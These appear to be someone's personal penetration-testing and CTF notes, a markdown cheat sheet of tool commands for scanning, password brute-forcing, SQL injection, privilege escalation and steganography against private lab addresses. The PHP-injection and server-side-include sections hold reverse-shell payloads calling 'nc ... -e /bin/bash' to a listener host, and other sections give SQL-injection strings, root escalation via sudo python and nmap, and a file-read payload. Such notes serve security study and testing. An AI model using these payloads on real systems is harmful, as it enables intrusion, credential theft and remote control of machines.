# nmap:
* ``nmap -sC -sV -O -A 192.168.1.10``
    * include -oX ... > ...xml for webmap
* scan network with pretty output:
    * ``nmap -oG - 192.168.1.0-255 -vv > ~/Desktop/results``
    * ``nmap -oG - 192.168.1.0-255 -p 22 -vv > ~/Desktop/results``
* scan network services (aggresive)
    * ``nmap -A 192.168.1.1/24``
* scan network services with version numbers
    * ``nmap -sV 192.168.1.123``
* scan multiple
    * ``nmap google.com vg.no``
* NSE (nmap scripting)
    * ``nmap --script=... 192.168.1.1``
        * located at /usr/share/nmap/scripts
    * ssh-brute.nse; ssh-hostkey.nse; telnet-brute.bs
    * run discovery(default) scripts on ip
        * ``nmap -sC 192.168.1.1 (use with -sV)``
    * nmap -sT for ports
    * stealth scan nmap -sS

# FTP

```
anonymous login:
# ftp 192.168.1.10
username: anonymous
password: null

# download file:
get file.txt
```

# nikito:
```bash
nikito -h http://192.168.1.4/
```

# Exif (Exchangeable image file format)
```
exif FILE
```

# john the ripper
* zip/rar file:
    * get assword hash:
        * zip:
            * ``zip2john FILE > hash.txt``
        * rar:
            * ``rar2john FILE > hash.txt``
            * ``john --format=zip hash.txt``
        * crack linux user /etc/shadow
            * ``john /etc/shadow``
        * hashed password
        * save (decoded?) md5 hash to file.txt
            * ``john file.txt``

# Medusa
```bash
medusa -h 192.168.1.10 -u olav -P wordlist.txt -M ssh -n 22
```

# sqlmap (SQL Injection)
* intercept login requst with burp
* rightclick>save as file.txt

```
sqlmap -r file.txt --dbs    // scan for databases
sqlmap -u http://vg.no --dbs
sqlmap -r file.txt -D DB_NAME --tables   // select database by name and enumerate tables
sqlmap -r file.txt -D DB_NAME -T TABLE_NAME --dump    // select table
```

# dirbuster
* turn up threads limit
* wordlists in /usr/share/wordlists/dirbuster/        /directory-list-2.3-medium.txt
* from terminal:
```
dirb http://192.168.1.10
```

# cewl
* generate wordlist from web page:
```
cewl http://192.168.1.10/?q=node/1 -w list.txt
```

# netcat
* setup server:
```bash
nc -nvlp 1234
```

* setup client:
```bash
nc -nv 192.168.1.10 1234
```
* save any incoming file/input:
```bash
nc -nvlp 1234 > data.txt/sh
```

# outguess (encrypt/decrypt embeded image)
* To embed the message hidden.txt into the monkey.jpg image:
```bash
outguess -k  "my secret pass phrase" -d hidden.txt monkey.jpg out.jpg
```
* retrieve the hidden	message	from the image:
```bash
outguess -k "my secret pass phrase" -r out.jpg message.txt
```

# stegextract (extract hidden files and strings from images)
* installation:
```bash
sudo curl https://raw.githubusercontent.com/evyatarmeged/stegextract/master/stegextract > /usr/local/bin/stegextract
sudo chmod +x /usr/local/bin/stegextract
```
* extract hidden files and strings from images

```bash
stegextract simple.gif --output out
unzip out
cat secret.txt
stegextract complex.jpg --analyze --strings
```

# StegCracker ( brute-force utility to uncover hidden data inside files)
```bash
stegcracker <file>
stegcracker <file> [<wordlist>]
```

# burp suite
* first enable proxy 127.0.0.1 -p 8080 in connection settings firefox
    * or use foxyproxy basic addon
    * use burp with default setting
    * set burp proxy as the same
    * brute forcing
        * set proxy>intercept  on while browsing web application
        * submit login form while intercepting, get GET request for login
            * check cookie
            * right click > send to intruder, forward request()
                * hit clear and use cluster bomb attackt type for 2 values
                    * highlight username value, click add
                    * highlight ppassword value, click add
                        * payloads, select payload set value 1, add custom usernames or load from list, do the same for value 2 (pw)
                        * wordlists are in /usr/share/wordlists/metasploit
                            * set payload type to simple list
                            * click intruder in top menu and hit start attack
                                * look for abnormalities in results (different length)
                                    * check response>render if logged in
    * target scope
        * enable proxy > target > site map > refresh site
            * rightclick on only the server dir and not external links/libs > add to scope
            * rightclick > spider this branch
                * ignore prompts, if creds is available enter in spider>options>application login
                * or try sql injection with username:"admin' or 1=1 --"
                    * rightclick>spider this branch again
                        * click filter bar>show only in-scope items

# rpc (nulll client login)
```bash
rpcclient -U "username" 192.168.1.10
enum
enumdomusers
```

# wafwoof
* basic usage: ``wafw00f https://192.168.1.32/``

# owasp sap
* find hidden files (burp premium feature)
    * enable web browser proxy
        * set local proxy in sap>options to localhost
            * reload page
                * sites > server dir > rightclick > spider > start scan (http://192.168.1.43/server/)
                    * rightclick>forced browse directory and children
                        * choose site and list, redo previous step
                        * look for interesting folders (notes, passwords, users, accounts), php scripts (database)


# sql-injection

* input random charactes in login forms ```('<!#=.->/")``` to try and provoke sql error
* ``'or 1=1 --``
* ``username = admin ' --   password = '``

# dotdotpwn
```bash
dotdotpwn -m http -h 192.168.1.53
```

# heartbleed use with openssl v 1.0.1 and 1.0.2-beta

![heartbleed.py](https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/heartbleed/heartbleed.py)
```bash
python ./heartbleed.py 192.168.1.10 -p 8443
```
* use with nmap: ``nmap -p 8443 --script ssl-heartbleed 192.168.1.105``

#  linux exploit suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

# php injection
```php
file.php?message=test;system("whoami"); // run any unix command
```
* get shell acccess
    * open terminal and enter 'nc -nvlp 1234'
        * in browser enter file.php?message=test;system("nc 192.168.1.10 1234 -e /bin/bash");

# html injection (stored)
* enter in stored form
```html
<iframe src="192.168.1.10:1234/test" height="0" width="0"></iframe>
```
* open terminal and enter: "nc -nvlp 1234"

# commix (command injection tool -- get reverse shell)
* intercept a form request with burp
```bash
commix --url="192.168.1.11/post.php" --cookie="" --data=""
```

# server-side includes (ssi)
** find post form and enter:
```html
<--!#exec cmd="whoami" -->
```
* can alo use with nc to get reverse shell:
```html
<--!#exec cmd="nc -nv 192.168.1.10 1234 -e /bin/bash" -->
```
**try without quotes if it fails**

# wordpress
> wpscan
* brute-force password with known username:
    * ``wpscan --url 192.168.1.0 --wordlist ABSOLUTE_PATH --username Olav``
    * ``wpscan --url http://192.168.1.10/wordpress``   (if it fails use with -at -ap -eu)
        * if any usernames is found save in file and try and crack ssh with hydra
    * brute force login
        * get wordpress login page by using nikito, dirbuster, zoom, wpscan
            * turn on local proxy, intercept request with burp
                * get post request
                    * if wordlist contains only username set password to something random (this only gets username) -V = verbose. url must be customized from post request.
                    * ``hydra -V -L wordlist.dic -p 123 192.168.1.10 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'``
                        * look for change in request to get correct username

> zoom (much faster than wp-scan)
discover wordpress on site and find users and vulnerabilites:
```bash
./zoom.py -u http://192.168.1.34/
```
* get reverse shell while wp admin:
    * mfsconsole > search wp_admin > use found exploit
    * or: download reverse shell php script > edit script with host
        * upload scriipt to a page in wp admin panel
            * ``nc -lvp 1234``
            * `` curl http://192.168.1.10/404.php `` (use the selected page)

# hydra
* put possible usernames in file.txt
```bash
hydra -L file.txt -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.1.10
```
* small l and small p to enter literal
```bash
hydra -t 1 -l admin -P /root/Desktop/password.lst -vV 192.168.1.1 ftp
```

# metasploit (msfconsole)
* modules located at ``/usr/share/metasploit-framework/modules``
* use an exploit/module:
    * ``use exploit/windows/browser/adobe_flash_avm2``
        * 'show' gives info on an exploit/module
            * ``'show options'``
            * ``'show payloads'``
            * ``'show targets'``
            * ``'show info'``
        * set SRVPORT 80 (enter, see show options)
    * search for modules:
        * ``search vsftpd``
        * ``search ssh_version``
        * ``search type:exploit platform:windows flash``
    * execute exploit:
        * 'exploit'
        * scan auxuiliary:
        * 'run'
    * back/exit
    * searchsploit openssh 6.6

# enum4linux:
```bash
enum4linux 192.168.1.10
```

# unix
```bash
uname
lsb_release -a
/etc/os-release
/etc/issue
id to check if in sudo group
```
linenum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

* check wp-config.php if wordpress
* netstat -antp

* linux exploit suggester
    * can probably write(and download) to /tmp
    * sudo -l (display all files that can be run by sudo)
    * get root
        * python (check sudo -l)
            * sudo /usr/bin/python
                * import os
                    * os.system('/bin/bash')
    * if root check /root for flag
    * spawn shell (if reverse shell is logged in as daemon)
        * /bin/sh -i
        * python -c 'import pty; pty.spawn("/bin/sh")'
    * find / -perm 4000 2>/dev/null
* find files belonging to user
    * ``find / -user olav`` (python scripts are good to get reverse shell from)

# get root using nmap:
```bash
nmap --interactive
!sh
```


# misc
* download only images from url:
    * ``wget -nd -r -P /save/location -A jpeg,jpg,bmp,gif,png http://www.somedomain.com`` (remove -nd to keep dir hierarhy)
    * if logged in but dont have password read token in cookie
        * jsonwebtoken.io (decoder)
        * md5online.org (decrypt md5)
        * crackstation.net (password hash cracker)
        * Cookie Editor (firefox addon)
        * hash-identifier to recognize hashes
        * ``.../iframei.php?ParamUrl=666   /etc/passwd  iframe``
    * decode base64
        * decode: ``echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode && echo``
        * encode: ``echo 'haha yes hva skjer' | base64  && echo``
    * read bin file with ``'strings FILENAME'``
    * onlinehashcrack.com
    * http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
    * transfer file from one machine to another using python:
        * from the directory the file is in open terminal and enter 'python -m SimpleHTTPServer'
            * from receiver enter: 'wget http://192.168.1.10/file'
    * whatcms.org
        * Striker - Striker is an offensive information and vulnerability scanner. Mainly DNS
    * https://gchq.github.io/CyberChef/ ENCODER/DECODER
    * sqlmap: https://github.com/sqlmapproject/sqlmap 
    * compile C: gcc file.c -o file (read payload notes)
    * su - olav (- provides a new shell, logs a user in completely)
    * optimize a huge wordlist:
        * cat file.dic | sort -u | uniq > fileNew.dic    // sorts in ascending, uniques
    * locale file exclusion (look for html comments):
        * example: ?lang=php://filter/convert.base64-encode/resource=index

* vim
    * open vim from more: press v
    * open another file in vim ``:e /etc/passwd``
    * open files in screen split
        * ``:vsplit <filename>``
        * ``:split <filename>``
    * get shell: ``:!/bin/bash :!/bin/sh``





# php
** interactive: php -a

#b/ misc
** grep
*** ommit match
**** grep -v removethisline file.txt
**** grep -v -- ----- public.key
** open image: eog FILE
** find files with locate (much faster than find using a previously built database)
*** sudo updatedb
**** locate FILE
** Debuggex: Online visual regex tester. JavaScript, Python, and PCRE
*** https://www.debuggex.com/
** https://github.com/JohnHammond/ctf-katana
gtfobins
** pipe to wc -c to get number of bytes in a string (can also be used for chars and newlines) -1
** If you cannot run ls or dir, or find or grep, to list files you can use:
*** echo * or echo /any/path/*
*** If you are a restricted shell like rbash you can still read any file with some builtin commands:
**** mapfile -t  < /etc/passwd
**** printf "$s\n" "${anything[@]}"
** get shell from vim:
*** :set shell=/bin/bash >>> :shell
** Command & Conquer == command injection &&
*** ls && cat flag.txt
** owasp top 10d

CTFd Scrapper
https://github.com/ichinano/CTFdScraper
powered by CTFd

pwnfunction

https://www.wappalyzer.com/

xdg-open file   // open in standard program

crackstation
tcpdump -i INTERFACE icmp // check for incoming pings

curl -XPOST http://10.0.0.10/login -d 'username=admin&password=admin'; echo
curl -XPOST http://10.0.0.10/ .H 'Authorization: Bearer jfOFfjf8f0kffhfhy.sjnls7lnsd8sln.slijn3ljnj3njb'; echo   // use jwt cookie to curl website  (pipe to jq to get pretty json)
```

```javascript
javascript:console.log(require('fs').readFileSync('flag.txt').toString())
```